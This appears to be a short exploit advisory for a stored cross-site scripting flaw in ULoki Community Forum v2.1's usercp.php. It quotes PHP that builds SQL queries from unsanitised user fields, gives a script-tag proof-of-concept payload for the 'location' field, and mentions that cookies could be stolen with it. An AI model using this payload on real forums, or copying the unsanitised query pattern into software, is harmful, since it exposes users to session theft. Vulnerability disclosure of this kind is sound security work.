@@ -1,0 +1,55 @@
+# Exploit Title: ULoki Community Forum v2.1 (usercp.php) Cross Site Scripting
+# Date: 10/02/2010
+# Author: Sioma Labs
+# Software Link: http://www.uloki.com/download/uloki_forum_06_may_2009.zip
+# Version: v2.1
+# Tested on: Windows SP 2 / WAMP
+# CVE : 
+# Code : 
+
+  ____  _                         _          _         
+ / ___|(_) ___  _ __ ___   __ _  | |    __ _| |__  ___ 
+ \___ \| |/ _ \| '_ ` _ \ / _` | | |   / _` | '_ \/ __|
+  ___) | | (_) | | | | | | (_| | | |___ (_| | |_) \__ \
+ |____/|_|\___/|_| |_| |_|\__,_| |_____\__,_|_.__/|___/
+                                                       
+ ======================================================
+
+
+xSS Vuln Page
+
+Vuln C0de (usercp.php) 
+----------------------
+
+$checke=$db->count_rows("SELECT email FROM b_users WHERE email='$email' AND userid='$user->userid'");
+if($checke > 0)
+{
+print "</td></tr></table>";
+$db->update_data("UPDATE b_users SET mb='$mb', location='$loc' WHERE userid='$user->userid'");
+err_msg("User CP","Your information has been updated.");		
+}
+
+-----------------------
+
+http://server/forum/usercp.php
+
+
+POC
+----
+
+place this code on "location" 
+
+"><script>alert(String.fromCharCode(88, 83, 83));</script>
+
+
+--------------------------------------------------------
+
+
+Note 
+----
+
+If an Attacker prefers the attacking process could be done by stealing cookies of other users  
+
+-------------------------
+Site: http://siomalabs.com
+Author : Sioma Agent 154
